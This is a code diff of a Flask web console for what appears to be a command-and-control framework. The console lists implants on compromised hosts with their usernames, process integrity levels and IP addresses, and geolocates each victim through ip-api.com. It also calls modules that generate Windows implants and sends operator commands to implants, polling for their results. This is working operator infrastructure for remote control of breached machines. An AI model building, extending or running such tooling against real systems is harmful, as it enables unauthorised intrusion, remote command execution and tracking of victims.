@@ -1,15 +1,23 @@
-import time
-import Take_Control
-from flask import Flask, render_template, request, redirect, url_for, jsonify
-import requests, json
+from flask import Flask, render_template, request, jsonify
+from flask_cors import CORS
+import requests
+import Services
+
 from Services.Implant_Generation import Assembly_Gen
 from Services.Implant_Generation import Basic_Gen
-import Internals
-import Utilities
+from Services.Convert_Time import convert_time
+from Services.Diff_Secondes import secdiff
+from datetime import timezone, timedelta
+import Take_Control
+import datetime
+import time
+import json
 
 app = Flask(__name__)
+CORS(app)
 
 result_history = []
+
 
 @app.route('/Authentification', methods=['POST'])
 def authentification():  # put application's code here
@@ -17,22 +25,128 @@ def authentification():  # put application's code here
     ip = form_data.getlist("ip")[0]
     port = form_data.getlist("port")[0]
     req = requests.get("http://" + ip + ":" + port + "/Listeners")
-    print(req)
 
     if req.status_code == 200:
-        return render_template('index.html')
+        return index()
     else:
         return render_template('Authentification.html')
+
 
 @app.route('/')
 def authentification_page():  # put application's code here
     return render_template('Authentification.html')
 
 
-
 @app.route('/index')
 def index():  # put application's code here
-    return render_template('index.html')
+
+    count_connected = 0
+    count_disconnected = 0
+    ############################LISTENERS####################################
+
+    doc = {}
+    name_list = []
+
+    url = "http://localhost:8000/Listeners"
+    req = requests.get(url)
+    content = req.text
+    json_obj = json.loads(content)
+    flag = 0
+
+    while flag != len(json_obj):
+        name_list.append(json_obj[flag]["name"])
+        flag = flag + 1
+
+    for name in name_list:
+        url = "http://localhost:8000/Listeners/" + name
+
+        req = requests.get(url)
+
+        content = req.text
+
+        new_json_obj = json.loads(content)
+
+        doc[new_json_obj["name"]] = new_json_obj["bindPort"]
+
+    ############################IMPLANTS####################################
+
+    docImplant = {}
+    implant_id_list = []
+    integrity_list = []
+    Coordinate_list = []
+
+    url = "http://localhost:8000/Implants"
+    req = requests.get(url)
+    content = req.text
+
+    json_obj = json.loads(content)
+
+    flag = 0
+
+    while flag != len(json_obj):
+        implant_id_list.append(json_obj[flag]["metadata"]["id"])
+        flag = flag + 1
+
+    for id in implant_id_list:
+        url = "http://localhost:8000/Implants/" + id
+        req = requests.get(url)
+        content = req.text
+
+        information_list = []
+
+        json_obj = json.loads(content)
+        information_list.append(json_obj["metadata"]["hostname"])
+        information_list.append(json_obj["metadata"]["username"])
+        information_list.append(json_obj["metadata"]["id"])
+        information_list.append(json_obj["metadata"]["processName"])
+        information_list.append(json_obj["metadata"]["integrity"])
+        information_list.append(json_obj["metadata"]["localIP"])
+        information_list.append(json_obj["metadata"]["publicIP"])
+
+
+        integrity_list.append(json_obj["metadata"]["integrity"])
+        response = requests.get(f'http://ip-api.com/json/{json_obj["metadata"]["publicIP"]}')
+        if response.status_code == 200:
+            data = response.json()
+            lat = data['lat']
+            lon = data['lon']
+            Coordinate_list.append({'lat': lat, 'lon': lon, 'hostname': json_obj["metadata"]["hostname"], 'IP_Public': json_obj["metadata"]["publicIP"]})
+        else:
+            print(f'Failed to get location for IP {json_obj["metadata"]["publicIP"]}')
+
+        # Convert date lasteen seen return by Implant (string) to date
+        delta_time = time.localtime().tm_hour - datetime.datetime.now(timezone.utc).hour
+        convert_timedelta = timedelta(hours=delta_time)
+        lastseen = json_obj["lastSeen"]
+        implant_date = Services.Convert_Time.convert_time(lastseen)
+        convert_lastseen = convert_timedelta + implant_date
+        information_list.append(convert_lastseen)
+
+        # Format and convert actual time to string
+        actual_date = datetime.datetime.now() - convert_timedelta
+        test = actual_date.isoformat()
+        SplitTime = test.split(".")
+        local_time = SplitTime[0].replace("T", " ")
+
+        # Format date lasteen seen return by Implant (string) to match with actual time string
+        lastseen_split_point = lastseen.split(".")
+        lastseen_reformate = lastseen_split_point[0].replace("T", " ")
+
+        # Check if implant is disconnected
+        bool_checker = Services.Diff_Secondes.secdiff(local_time, lastseen_reformate)
+
+        # Add status implant connected/disconnected in board
+        if bool_checker:
+            information_list.append("Connected")
+            count_connected = count_connected + 1
+        else:
+            information_list.append("Disconnected")
+            count_disconnected = count_disconnected + 1
+
+        if json_obj["metadata"]["id"] not in docImplant:
+            docImplant[json_obj["metadata"]["id"]] = list()
+        docImplant[json_obj["metadata"]["id"]].extend(information_list)
+    return render_template('index.html', doc=doc, docImplant=docImplant, count_disconnected=count_disconnected, count_connected=count_connected, integrity_list=integrity_list, Coordinate_list=Coordinate_list)
 
 
 # Listener Section
@@ -46,19 +160,19 @@ def show_listener():
     form_data = request.form
     name = form_data.getlist("Name")[0]
 
-    req = requests.request("get", "http://172.24.192.28:8000/Listeners/" + name)
+    req = requests.request("get", "http://localhost:8000/Listeners/" + name)
     return req.content
 
 
 @app.route("/Listener/ShowListeners", methods=['POST'])
 def show_listeners():
-    req = requests.request("get", "http://172.24.192.28:8000/Listeners")
+    req = requests.request("get", "http://localhost:8000/Listeners")
     return req.content
 
 
 @app.route('/Listener/CreateListener/', methods=['POST'])
 def create_listener():
-    url = "http://172.24.192.28:8000/Listeners"
+    url = "http://localhost:8000/Listeners"
 
     if request.method == 'GET':
         return f"The URL /data is accessed directly. Try going to '/form' to submit form"
@@ -82,7 +196,7 @@ def create_listener():
 def delete_listener():
     form_data = request.form
     name = form_data.getlist("Name")[0]
-    url = "http://172.24.192.28:8000/Listeners/" + name
+    url = "http://localhost:8000/Listeners/" + name
     req = requests.delete(url)
     if req.status_code == 204:
         return "<p>Listener " + name + " is deleted</p>"
@@ -112,6 +226,99 @@ def windows_gen():
 
     return Basic_Gen.main("windows", ip, port)
 
+# board
+@app.route("/Board", methods=['GET', 'POST'])
+
+def board_page():
+    ############################LISTENERS####################################
+    doc = {}
+    name_list = []
+
+    url = "http://localhost:8000/Listeners"
+    req = requests.get(url)
+    content = req.text
+    json_obj = json.loads(content)
+    flag = 0
+
+    while flag != len(json_obj):
+        name_list.append(json_obj[flag]["name"])
+        flag = flag + 1
+
+    for name in name_list:
+        url = "http://localhost:8000/Listeners/" + name
+
+        req = requests.get(url)
+
+        content = req.text
+
+        new_json_obj = json.loads(content)
+
+        doc[new_json_obj["name"]] = new_json_obj["bindPort"]
+    ############################IMPLANTS####################################
+    docImplant = {}
+    implant_id_list = []
+
+    url = "http://localhost:8000/Implants"
+    req = requests.get(url)
+    content = req.text
+
+    json_obj = json.loads(content)
+
+    flag = 0
+
+    while flag != len(json_obj):
+        implant_id_list.append(json_obj[flag]["metadata"]["id"])
+        flag = flag + 1
+
+    for id in implant_id_list:
+        url = "http://localhost:8000/Implants/" + id
+        req = requests.get(url)
+        content = req.text
+
+        information_list = []
+
+        json_obj = json.loads(content)
+        information_list.append(json_obj["metadata"]["hostname"])
+        information_list.append(json_obj["metadata"]["username"])
+        information_list.append(json_obj["metadata"]["id"])
+        information_list.append(json_obj["metadata"]["processName"])
+        information_list.append(json_obj["metadata"]["integrity"])
+        information_list.append(json_obj["metadata"]["localIP"])
+
+        # Convert date lasteen seen return by Implant (string) to date
+        delta_time = time.localtime().tm_hour - datetime.datetime.now(timezone.utc).hour
+        convert_timedelta = timedelta(hours=delta_time)
+        lastseen = json_obj["lastSeen"]
+        implant_date = Services.Convert_Time.convert_time(lastseen)
+        convert_lastseen = convert_timedelta + implant_date
+        information_list.append(convert_lastseen)
+
+        # Format and convert actual time to string
+        actual_date = datetime.datetime.now() - convert_timedelta
+        test = actual_date.isoformat()
+        SplitTime = test.split(".")
+        local_time = SplitTime[0].replace("T", " ")
+
+        # Format date lasteen seen return by Implant (string) to match with actual time string
+        lastseen_split_point = lastseen.split(".")
+        lastseen_reformate = lastseen_split_point[0].replace("T", " ")
+
+        # Check if implant is disconnected
+        bool_checker = Services.Diff_Secondes.secdiff(local_time, lastseen_reformate)
+
+        # Add status implant connected/disconnected in board
+        if bool_checker:
+            information_list.append("Connected")
+
+        else:
+            information_list.append("Disconnected")
+
+        if json_obj["metadata"]["id"] not in docImplant:
+            docImplant[json_obj["metadata"]["id"]] = list()
+        docImplant[json_obj["metadata"]["id"]].extend(information_list)
+
+        docImplant = docImplant
+    return render_template('Board.html', doc=doc, docImplant=docImplant)
 
 #Implants
 
@@ -121,7 +328,7 @@ def implant_page(resultat =""):
 
 @app.route("/Implant/ShowImplant", methods=['POST'])
 def show_implant():
-     req = requests.request("get", "http://172.24.192.28:8000/Implants")
+     req = requests.request("get", "http://localhost:8000/Implants")
      return render_template('Implant.html',resultat=req.content)
 
 @app.route("/Implant/ShowImplantByID", methods=['POST'])
@@ -130,19 +337,14 @@ def show_implant_by_id():
      form_data = request.form
      name = form_data.getlist("Name")[0]
 
-     req = requests.request("get", "http://172.24.192.28:8000/Implants/" + name)
+     req = requests.request("get", "http://localhost:8000/Implants/" + name)
      return req.content
 
 @app.route("/TakeControl/TakeControl", methods=['POST'])
 def take_control():
 
-     #form_data = request.form
-#     name = form_data.getlist("id_implant")[0]
      id_implant = request.form['id_implant']
- #    mon_champ = request.form.get('id_implant')
-     #return redirect(url_for('page_suivante', mon_param=id_implant))
      return render_template('TakeControl.html', mon_param=id_implant)
-
 
 # Take Control
 @app.route("/TakeControl", methods=['GET'])
@@ -163,41 +365,10 @@ def send_command():
     command = ""
     com = request.form['command']
     print("com: " + str(com))
-
-
-
-    # #Split les arguments de la commande si il y en a
-    # command_split = com.split(" ")
-    # print("command_split : " + str(command_split))
-    # if len(command_split) == 1 :
-    #     print('ici')
-    #     data = {'command': command_split[0]}
-    # else :
-    #     for i in range(0, len(command_split)):
-    #         print('i = ' + str(i))
-    #         if i == 0:
-    #             command = command_split[i]
-    #         else:
-    #             arg.append(command_split[i])
-    #     data = {'command': command, "arguments": arg}
-    # # input()
-
-
-
-    # print("data :  " + str(data))
-    # input()
     hidden_value = request.form['id_implant']
-    # headers = {"Content-Type": "application/json", "accept": "*/*"}
-    #
-
     task = Take_Control.take_control_menu(hidden_value,com)
-    # print(task)
-    # response = requests.post('http://172.24.192.28:8000/Implants/' + hidden_value, json=data, headers=headers)
-    # result = json.loads(response.content)
-    # task = result["id"]
     print(task)
-
-    response = requests.get('http://172.24.192.28:8000/Implants/' + hidden_value + '/tasks/' + task)
+    response = requests.get('http://localhost:8000/Implants/' + hidden_value + '/tasks/' + task)
     content = response.text
     print("Content : " + content)
     time.sleep(2)
@@ -205,7 +376,7 @@ def send_command():
     # Attendre que la tâche soit terminée et récupérer le résultat
     while response.text == "task not found":
 
-            response = requests.get('http://172.24.192.28:8000/Implants/'+hidden_value + '/tasks/'+ task )
+            response = requests.get('http://localhost:8000/Implants/'+hidden_value + '/tasks/'+ task )
             print(response)
             content = response.text
             print(content)
@@ -233,5 +404,5 @@ def get_result_history():
 
 
 if __name__ == '__main__':
-    app.run()
 
+    app.run(debug=True)
